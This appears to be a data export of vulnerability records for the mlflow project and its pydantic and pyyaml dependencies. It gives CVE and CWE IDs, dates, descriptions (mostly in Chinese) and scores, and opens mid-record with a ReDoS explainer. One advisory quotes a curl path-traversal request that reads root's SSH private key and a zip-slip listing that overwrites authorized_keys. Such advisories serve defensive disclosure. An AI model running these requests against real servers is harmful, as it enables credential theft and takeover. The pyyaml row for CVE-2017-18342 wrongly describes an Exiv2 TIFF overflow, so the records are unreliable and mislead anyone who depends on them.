The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631)
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
",3,2
mlflow_mlflow,pydantic,,True,CVE-2024-3772,CWE-1333,2024-04-15,"Pydantic是Pydantic开源的一个库。可以使用 Python 类型提示进行数据验证。
Pydantic 2.4.0之前、1.10.13之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过精心设计的电子邮件字符串造成拒绝服务。",3,0
mlflow_mlflow,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
mlflow_mlflow,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
mlflow_mlflow,mlflow,,True,CVE-2024-0520,CWE-22,,Mlflow是一个开源的平台，用于简化机器学习开发的生命周期，包括实验跟踪、代码打包和模型共享与部署。该漏洞源于`mlflow.data.http_dataset_source.py`模块中操作系统命令的特殊元素未得到正确中和，攻击者可以通过操控`Content-Disposition`头部中的文件名或URL路径包含恶意输入来执行任意代码。此漏洞允许攻击者完全控制文件路径，通过路径遍历或绝对路径技术，实现任意文件写入，例如用'../../tmp/poc.txt'或'/tmp/poc.txt'。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-3099,CWE-475,,Mlflow 是一个用于简化机器学习开发的开源平台，支持跟踪实验、打包可重复的运行和共享与部署模型。该漏洞源于对模型名称的验证不足，允许攻击者通过 URL 编码创建多个同名模型，因此可能导致拒绝服务（DoS），同时攻击者还可以利用此漏洞对数据模型进行污染。由于 URL 编码的模型在处理时被视为与其解码版本不同，从而导致了这一安全问题。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-2928,CWE-29 CWE-22,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括实验跟踪、代码打包以及模型的共享与部署。该平台存在安全漏洞，主要由于在解析 URI 片段时未能妥善验证其内容。攻击者可以通过操纵 URI 片段的部分，利用目录遍历序列如 '../' 来读取本地文件系统上的任意文件，甚至包括敏感文件如 '/etc/passwd'。该漏洞是对之前补丁的绕过，表明需要对 URI 的所有部分进行全面验证以防止本地文件包含攻击。,2,1
mlflow_mlflow,mlflow,,True,,,2023-05-01,"### Impact

Users of the MLflow Open Source Project who are hosting the MLflow Model Registry using the ``mlflow server`` or ``mlflow ui`` commands using an MLflow version older than **MLflow 2.3.1** may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).

This issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.

The vulnerability is very similar to https://nvd.nist.gov/vuln/detail/CVE-2023-1177, and a separate CVE will be published and updated here shortly.

### Patches

This vulnerability has been patched in MLflow 2.3.1, which was released to PyPI on April 27th, 2023. If you are using ``mlflow server`` or ``mlflow ui`` with the MLflow Model Registry, we recommend upgrading to MLflow 2.3.1 as soon as possible.

### Workarounds
If you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.

If you are using the MLflow open source ``mlflow server`` or ``mlflow ui`` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.

### References
",1,-2
mlflow_mlflow,mlflow,,True,,CWE-23,2023-05-04,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Relative Path Traversal due to allowing the ability to provide relative paths in registered model sources. 

**Note:**

This issue only affects users and integrations that run the `mlflow server` and `mlflow ui` commands. Integrations that do not make use of `mlflow server` or `mlflow ui` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way.

## Workaround

Users who are unable to upgrade to the fixed version should limit who can access MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism.
## Remediation
Upgrade `mlflow` to version 2.3.1 or higher.
## References
- [GitHub Commit](https://github.com/mlflow/mlflow/commit/f73147496e05c09a8b83d95fb4f1bf86696c6342)
- [GitHub Issue](https://github.com/mlflow/mlflow/issues/8273)
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8281)
- [GitHub Release](https://github.com/mlflow/mlflow/releases/tag/v2.3.1)
",1,2
mlflow_mlflow,mlflow,,True,,CWE-284,2023-05-02,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Access Restriction Bypass. Users of the MLflow Open Source Project who are hosting the MLflow Model Registry using the `mlflow server` or `mlflow ui` commands  may be vulnerable to a remote file access exploit if they are not limiting who can query their server (for example, by using a cloud VPC, an IP allowlist for inbound requests, or authentication / authorization middleware).

This issue only affects users and integrations that run the ``mlflow server`` and ``mlflow ui`` commands. Integrations that do not make use of ``mlflow server`` or ``mlflow ui`` are unaffected; for example, the Databricks Managed MLflow product and MLflow on Azure Machine Learning do not make use of these commands and are not impacted by these vulnerabilities in any way. The vulnerability is very similar to [CVE-2023-1177](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-3373049)

## Workarounds
If you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we strongly recommend limiting who can access your MLflow Model Registry and MLflow Tracking servers using a cloud VPC, an IP allowlist for inbound requests, authentication / authorization middleware, or another access restriction mechanism of your choosing.

If you are using the MLflow open source `mlflow server` or `mlflow ui` commands, we also strongly recommend limiting the remote files to which your MLflow Model Registry and MLflow Tracking servers have access. For example, if your MLflow Model Registry or MLflow Tracking server uses cloud-hosted blob storage for MLflow artifacts, make sure to restrict the scope of your server's cloud credentials such that it can only access files and directories related to MLflow.
## Remediation
Upgrade `mlflow` to version 2.3.1 or higher.
## References
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8281)
",1,2
mlflow_mlflow,mlflow,,True,,CWE-22,2023-07-02,"## Overview
[mlflow](https://pypi.org/project/mlflow/) is a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models.

Affected versions of this package are vulnerable to Directory Traversal via the function `_validate_non_local_source_contains_relative_paths` due to improper validation of the 'source' parameter.

## Details

A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with ""dot-dot-slash (../)"" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
```
**Note** `%2e` is the URL encoded version of `.` (dot).

- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. 

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys
```

## Remediation
Upgrade `mlflow` to version 2.4.1 or higher.
## References
- [GitHub ChangeLog](https://github.com/mlflow/mlflow/blob/6701fca95c8ee9ce1712c09a5291b0531c2fb108/CHANGELOG.md?plain=1#L14)
- [GitHub PR](https://github.com/mlflow/mlflow/pull/8648)
",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-2780,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。该漏洞源于 mlflow 没有正确验证来源的 URL，导致攻击者能够通过相对路径访问预期目录之外的文件并读取任意文件。攻击者可以使用形如 'file://./etc/' 的字符串绕过检查，从而下载与 mlflow 无关的任意文件，包括服务器上已存储的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-30172,CWE-22,2023-05-10,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow v2.0.1版本及之前版本存在安全漏洞。攻击者利用该漏洞可以通过path参数读取服务器上的任意文件。",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-2356,CWE-23,,MLflow 是一个开源的机器学习平台，用于管理机器学习项目、跟踪实验、构建模型和部署代码。MLflow 在 2.3.1 版本之前存在文件读取漏洞。攻击者在请求 /api/2.0/mlflow/registered-models/create 路由时可以通过 source 参数指定路径，随后利用 /model-versions/get-artifact 路由读取任意文件内容，可能导致敏感信息泄露。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-27133,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 dataset table字段的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,,True,CVE-2024-27132,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 template变量的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,,True,CVE-2023-6977,CWE-29,,MLflow 是一个用于简化机器学习开发的开源平台，支持实验跟踪、代码打包以及模型的共享和部署。在版本 2.9.2 之前的 MLflow 中，存在一个安全漏洞。该漏洞源于 `is_local_uri()` 函数未能正确验证 URI，攻击者可以利用此漏洞从主机服务器下载任意文件，包括任何主机服务器可以访问的远程位置的文件。该漏洞允许攻击者读取服务器上的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6909,CWE-29,,MLflow 是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。受影响的版本在处理特制的文件路径时存在路径遍历问题，攻击者可能利用此漏洞读取或写入限制目录外的文件，这主要是由于在特定函数 `validate_path_is_safe` 中对路径的不足消毒所致。利用此漏洞时，攻击者提交经过设计的文件路径，可能包括 `..\` 序列，造成对任意文件的访问。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6975,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，具有实验跟踪、代码打包和模型共享等功能。存在路径遍历漏洞，攻击者可以通过特制的路径输入（利用目录遍历序列）来获取未授权的读或写权限，从而访问服务器上的文件。该漏洞源于对 FTP 模型中的路径验证的不当处理，允许攻击者进行远程代码执行，并检索数据和模型信息。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6976,CWE-434,,MLflow 是一个开放源代码的平台，用于简化机器学习开发，包括追踪实验、将代码打包为可重复运行的代码和共享及部署模型。受影响的版本存在目录遍历漏洞，通过在路径名中包含 `#` 可以绕过 `validate_path_is_safe()` 检查，从而允许攻击者向服务器上任意位置写入文件。该漏洞可以通过恶意的 `zip` 压缩包利用，导致路径遍历，最终在服务器的文件系统中写入恶意代码。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6974,CWE-918,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习项目的开发与管理。然而，MLflow 存在一个服务器端请求伪造 (SSRF) 漏洞。该漏洞的根本原因在于在处理 HTTP 请求时未能正确限制重定向行为，攻击者可以利用 `_download_file()` 函数触发此漏洞，访问内部资源并实现任意文件写入。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6940,CWE-77,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发、跟踪和部署。此漏洞源于对 jinja2 模板引擎的处理不当，攻击者可以利用其绕过安全限制，从而在受害者的系统上进行完整的命令执行。受影响的版本为 1.27.0 至 2.9.1，攻击者只需通过一次用户交互（例如下载恶意配置）即可发起攻击。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6831,CWE-29 CWE-22,,Mlflow是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。在版本2.9.2之前，Mlflow存在路径遍历漏洞。该漏洞的根本原因是对文件处理机制中传入的特殊输入没有进行适当的检查。攻击者可以通过对路径的URL编码来绕过安全验证。利用该漏洞，攻击者可以在受害者服务器上删除任意文件，具体取决于用户的权限。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6753,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在简化机器学习开发过程，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。在Mlflow的2.9.2之前版本中，存在路径遍历漏洞，此漏洞源于在加载数据集时未能正确处理URL路径，允许攻击者通过操控URL路径中的文件名，利用后斜杠来绕过目录限制，实现写入当前工作目录以外的文件。例如，通过构造恶意URL，用户可以被诱骗加载攻击者指定的文件，从而造成任意文件写入。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6709,CWE-1336,,Mlflow是一个机器学习生命周期的开源平台。该平台允许用户跟踪实验、打包代码为可重现的运行并共享和部署模型。Mlflow的2.9.2之前的版本存在安全漏洞，源于模板引擎中对特殊元素的处理不当。攻击者可以通过注入恶意输入到模板系统，从而在用户机器上执行任意代码。为了利用此漏洞，用户必须加载其在互联网上找到的配方配置。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6568,CWE-79,,Mlflow 是一个开源机器学习生命周期管理平台，允许用户跟踪实验、打包代码以及共享和部署模型。受影响版本在 2.9.0 之前，存在跨站脚本漏洞。攻击者可以通过在 POST 请求的 Content-Type 头中注入恶意代码，这些代码在缺乏适当消毒或转义的情况下反射回用户。这可能导致用户会话被劫持、敏感信息被窃取或在用户代理的上下文中执行其他恶意操作。,3,1
mlflow_mlflow,mlflow,,True,CVE-2023-43472,CWE-200,2023-12-05,MLflow 是一个用于管理机器学习生命周期的开源平台，提供了实验追踪、模型管理、项目打包等功能。MLflow 2.8.1版本及之前的版本存在一个安全漏洞，原因是特制 REST API 请求的处理不当。攻击者可以通过发送特制的 REST API 请求来获取敏感信息。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6014,CWE-598,,MLflow是一个开源的机器学习平台，旨在简化机器学习模型的开发和管理。此漏洞源于MLflow在其服务器和用户界面中实现基本身份验证的不当处理，允许攻击者绕过身份验证。具体而言，攻击者可以利用REST API创建用户/凭据集合，从而未授权访问模型、实验及系统中的其他重要数据。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6015,CWE-22,,MLflow 是一个开源平台，用于简化机器学习开发，包括跟踪实验、将代码打包成可重现的运行并共享和部署模型。受影响的版本存在路径遍历漏洞，该漏洞源于在 `handlers.py` 中的检查被跳过。攻击者可以通过路径遍历攻击从 Windows 的根目录中突破，读取或写入主机上的敏感数据（可能包括 SSH 密钥）。此漏洞仅在 Windows 操作系统上可被利用，利用示例包括发送包含 `C:../` 的请求。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-1177,CWE-29 CWE-22,,MLflow是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重复运行的方式以及共享和部署模型。在使用mlflow-server和mlflow-ui命令的情况下，存在路径遍历漏洞，攻击者可以利用此漏洞从主机服务器下载任意文件，包括与MLflow无关的文件。这一问题仅影响运行这些命令的用户，以及相关集成，比如在未受到限制的环境中使用此命令。,1,1
mlflow_mlflow,mlflow,,True,CVE-2022-0736,CWE-377,2022-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 中存在安全漏洞，该漏洞源于产品的tempfile.mktemp()函数未能正确处理多进程状态。攻击者可通过该漏洞创建同名临时文件。以下产品及版本受到影响：Mlflow 1.23.1 之前版本。",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-4033,CWE-78,,Mlflow 是一个开源的机器学习生命周期管理平台，提供实验跟踪、模型管理等功能。版本 2.6.0 之前的 mlflow 存在操作系统命令注入漏洞。该漏洞的根本原因是 `backend.py` 文件中的 `predict()` 方法未能正确转义参数，导致攻击者可以向 `models predict` 操作的 CLI 参数中注入恶意命令。当系统使用不当时，攻击者能够执行任意操作系统命令。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-3765,CWE-36,,Mlflow 是一个开源的机器学习生命周期管理平台。受影响的版本在 validate_path_is_safe() 函数中存在路径遍历漏洞，导致对绝对 Windows 路径的处理不当。攻击者可以利用此漏洞列出、下载、写入和删除系统文件。此漏洞仅在运行 Windows 操作系统的主机上可被利用。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-1176,CWE-36,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习的开发过程，包括实验追踪、代码打包和模型共享及部署。如果使用早于 MLflow 2.2.1 的版本，且未限制谁可以查询其服务器，可能会受到远程文件存在检查漏洞的影响。该漏洞发生在运行 mlflow server 或 mlflow ui 命令时，由于未对模型名称进行适当验证，导致攻击者能够检查主机服务器上任意文件的存在性。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-3573,CWE-29 CWE-22,,Mlflow 是一个开源的机器学习开发平台，旨在简化模型的训练、注册和部署。该平台的漏洞源于其 `is_local_uri` 函数对 URI 的解析不当，使得攻击者能够绕过检查并读取系统上的任意文件。具体来说，该函数未能正确处理空或 'file' 方案的 URI，从而导致误判 URI 为非本地。利用此漏洞，攻击者可以通过创建恶意模型版本并巧妙构造 'source' 参数，读取到服务器根目录下至少两个目录层级内的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-1560,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在帮助用户简化机器学习模型的管理和部署。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于无法正确清理用户提供的路径，攻击者可以利用该漏洞删除服务器文件系统上的任意目录。该漏洞的根本原因是`local_artifact_repo.py`中的`delete_artifacts`函数存在额外的url反转操作，导致无法有效防止路径遍历序列的出现。攻击者可以利用`_delete_artifact_mlflow_artifacts`处理程序和`local_file_uri_to_path`函数中的双重解码过程来触发该漏洞。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-3848,CWE-29 CWE-22,,mlflow 是一个用于简化机器学习开发的开源平台，允许跟踪实验、将代码打包为可重现的运行，并分享和部署模型。受影响的版本 2.11.0 存在路径遍历漏洞，该漏洞源于对创建的 artifact URL 的片段部分验证不当。攻击者可以通过构造特定的 URL（使用 '#' 字符插入路径）来绕过验证，进而访问文件系统路径，从而读取任意文件，包括敏感信息如 SSH 和云密钥。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-4263,CWE-284,,Mlflow 是一个用于简化机器学习开发的开源平台，提供跟踪实验、将代码包装为可重复运行的代码以及共享和部署模型的功能。Mlflow 2.10.1 之前的版本在处理用户 EDIT 权限的 DELETE 请求时缺乏适当的验证，这导致低权限攻击者能够在未授权的情况下删除任何工件。这种漏洞的根本原因在于访问控制的错误实现，允许攻击者以其低权限删除包括目录在内的工件。这种不当访问控制使得原本只能读取和更新工件的用户能够进行删除操作。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-1558,CWE-22,,Mlflow 是一个机器学习生命周期的开源平台。该漏洞源于对 'source' 参数验证不当。在 `_create_model_version` 函数中，攻击者可以发送特制的 `source` 参数，绕过 `_validate_non_local_source_contains_relative_paths(source)` 函数的检查，从而获得对服务器上任意文件的读取访问权限。这一问题源于处理未加引号的URL字符及在模型版本创建时错误地使用原始 'source' 值，导致在与 `/model-versions/get-artifact` 处理程序交互时敏感文件暴露。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1483,CWE-22,,Mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括跟踪实验、打包代码并分享和部署模型。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于对用户输入验证不足。攻击者可以通过构造特定的HTTP POST请求，利用 'artifact_location' 和 'source' 参数，使用包含 '#' 组件的本地URI，访问服务器上的任意文件。这种攻击利用了目录遍历，允许攻击者访问服务器上不应被公开的文件。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1593,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该平台用于简化机器学习开发，包括实验跟踪、将代码打包为可重复运行的程序以及共享和部署模型。Mlflow存在路径遍历漏洞，该漏洞源于对URL参数处理不当。攻击者可以利用;字符在URL中传递路径遍历序列，从而操控URL的params部分，获得对系统中文件或目录的未授权访问。攻击者可以使用像'../'这样的路径序列，访问存储在文件系统中任意的文件或目录。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1594,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该漏洞存在于Mlflow 2.9.2版本及更早版本中，攻击者可以利用该漏洞在创建实验时，通过操纵'artifact_location'参数来触发路径遍历攻击。在URI中使用片段组件'#'，攻击者可以读取服务器上任意文件。这个漏洞类似于CVE-2023-6909，但利用了URI中的不同组件来达到相同效果。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6018,CWE-78,,MLflow 是一个开源的平台，用于简化机器学习的开发流程，包括实验的跟踪、代码的封装和模型的共享与部署。在受到影响的版本中，通过对 `/ajax-api/2.0/mlflow/model-versions/create` 的请求，存在操作系统命令注入漏洞。攻击者可以利用此漏洞覆盖 MLflow 服务器上的任意文件，从而在受影响的机器上执行命令并获取数据和模型信息。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-6838,CWE-400,,MLflow是一个开源的机器学习开发平台，旨在简化机器学习项目的管理，提供实验跟踪、模型部署等功能。在MLflow版本v2.13.2中，由于实验名称缺少限制，存在安全漏洞，允许创建或重命名实验时使用大量整数，这可能导致MLflow用户界面失去响应，从而导致拒绝服务。此外，在创建实验时，`artifact_location`参数也没有字符限制。,3,1
mlflow_mlflow,mlflow,,True,CVE-2025-0453,CWE-410,,MLFlow 是一个开源的机器学习平台，旨在简化机器学习工作流的管理。在 MLFlow 版本 2.17.2 中，`/graphql` 端点存在拒绝服务攻击（DoS）的漏洞。攻击者可以创建大量复杂的查询批次，反复请求特定实验下的所有运行记录，导致 MLFlow 分配的所有工作者被大量请求占用，无法响应其他请求。这一漏洞源于对资源消耗的未受控管理。,2,1
mlflow_mlflow,mlflow,,True,CVE-2025-52967,CWE-918,2025-06-23,MLflow是一款用于管理机器学习生命周期的开源平台，涵盖了实验跟踪、项目部署和模型管理等功能。该漏洞涉及MLflow中的gateway_proxy_handler组件，该组件负责处理网关路径请求，然而在版本3.1.0之前，其路径验证功能存在缺失。这种缺陷使得某些未经验证的输入可以通过此组件传递，可能导致非法请求被接收和处理。,3,2
mlflow_mlflow,mlflow,,True,CVE-2024-27134,CWE-276 CWE-367,2024-11-25,MLflow 是一个开源的平台，旨在简化机器学习开发，它包括了管理和跟踪实验、将代码打包成可重复的运行以及共享和部署模型的能力。在 MLflow 中，由于目录权限设置过多，使用 spark_udf 功能时存在本地特权升级的漏洞。这意味着攻击者可以通过利用这一漏洞获得更高的系统权限，从而执行未授权的操作。,2,0
mlflow_mlflow,mlflow,,True,CVE-2025-1473,CWE-352,,mlflow 是一个开源的机器学习平台，旨在管理机器学习生命周期的各个方面，包括实验跟踪、项目包装和模型部署。在版本 2.17.0 到 2.20.1 的注册功能中，存在跨站请求伪造（CSRF）漏洞。攻击者可以利用这一漏洞创建新账户，从而可在恶意用户的名义下执行未经授权的操作。这一漏洞的根本原因是对 CSRF 攻击缺乏足够的防护和验证，特别是在处理用户注册请求时。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-8859,CWE-29,,MLflow是一个开源的平台，旨在简化机器学习开发，包括跟踪实验、打包代码和共享模型。在MLflow的2.15.1版本中，发现了一个路径遍历漏洞，该漏洞源于dbfs服务的不当配置。具体而言，漏洞发生在`_validate_non_local_source_contains_relative_paths()`函数中，当`dbfs`服务被配置并挂载到本地目录而不是Databricks时，攻击者可以通过操纵`file:`协议中的URL读取任意文件，因为该实现未能适当清理路径之外的输入，如查询和参数。,2,1
mlflow_mlflow,mlflow,,True,CVE-2025-1474,CWE-521,,在 MLflow 版本 2.18 中，管理员可以在未设置密码的情况下创建新用户账户。MLflow 是一个开源的机器学习平台，旨在简化机器学习的开发和管理。由于缺乏对设置密码的要求，该漏洞可能导致未授权访问，从而引发安全风险。此外，这一做法违反用户账户安全管理的最佳实践。该漏洞已在版本 2.19.0 中修复。,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供实验跟踪、模型管理等功能。在测试过程中发现，当用户访问日志中的 PDF 工件时，存在定制 JavaScript 执行的漏洞。该漏洞是由项目的默认安装中使用的易受攻击的 PDFjs 封装导致的。攻击者可以通过上传特制的 PDF 文件来引发 JavaScript 的执行，从而影响其他用户。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow是一个开源的机器学习平台，允许数据科学家和开发者使用不同的工具进行机器学习模型的构建和管理。在AWS上，发现一个未被声明的S3存储桶，攻击者可以声称这个存储桶并获得对它的控制权。这种漏洞的根本原因是对S3存储桶的管理不当，导致存储桶处于可被恶意接管的状态。攻击者可通过直接访问未声明的S3存储桶地址，执行接管操作。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的整个生命周期，包括实验、重现和部署。该漏洞存在于 Github Actions 的工作流中，攻击者可以提交包含可执行代码的恶意 Pull Request，这些代码在没有适当授权的情况下执行，从而导致敏感令牌泄露并危及代码库的安全。</p>,1,1
